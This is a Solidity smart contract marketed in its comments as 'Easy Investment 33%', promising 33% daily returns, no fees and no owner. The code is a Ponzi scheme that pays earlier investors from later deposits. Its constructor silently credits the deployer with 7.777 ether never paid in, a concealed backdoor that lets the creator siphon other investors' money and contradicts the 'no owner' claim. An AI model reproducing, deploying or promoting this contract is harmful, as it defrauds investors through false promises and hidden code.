pragma solidity ^0.4.24;
/**
 *                                               __   
..-&#39;&#39;&#39;-.   ..-&#39;&#39;&#39;-.                .-..-.     / /   
\.-&#39;&#39;&#39;\ \  \.-&#39;&#39;&#39;\ \              / .&#39;&#39;. \   / /    
       | |        | |            |  |  |  | / /     
    __/ /      __/ /             |  |  |  |/ /      
   |_  &#39;.     |_  &#39;.              \ &#39;..&#39; // /       
      `.  \      `.  \             `-&#39;&#39;-&#39;/ /        
        \ &#39;.       \ &#39;.                 / /.-..-.   
         , |        , |                / // .&#39;&#39;. \  
         | |        | |               / /|  |  |  | 
        / ,&#39;       / ,&#39;              / / |  |  |  | 
-....--&#39;  /-....--&#39;  /              / /   \ &#39;..&#39; /  
`.. __..-&#39; `.. __..-&#39;              /_/     `-&#39;&#39;-&#39;   
 * 
 * Easy Investment 33% Contract
 *  - GAIN 33% PER 24 HOURS (every 5900 blocks)
 *  - NO COMMISSION on your investment (every ether stays on contract&#39;s balance)
 *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 70000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
 *
 * IMPORTANT / ВАЖНО !!!
 * Website launch 4 October 2018 12:00 PM
 * Cайт откроется 4 Октября 2018 12:00 PM
 * 
 * All news in comments!
 * Все новости в комментах!
 */
 
contract EasyInvest33 {
     // records amounts invested
    mapping (address => uint256) public invested;
    // records blocks at which investments were made
    mapping (address => uint256) public atBlock;
    constructor() public {
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += 7.777 ether;  
    }
    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 33% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 33 / 100 * (block.number - atBlock[msg.sender]) / 5900;

            // send calculated amount of ether directly to sender (aka YOU)
            msg.sender.transfer(amount);
        }
        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }
}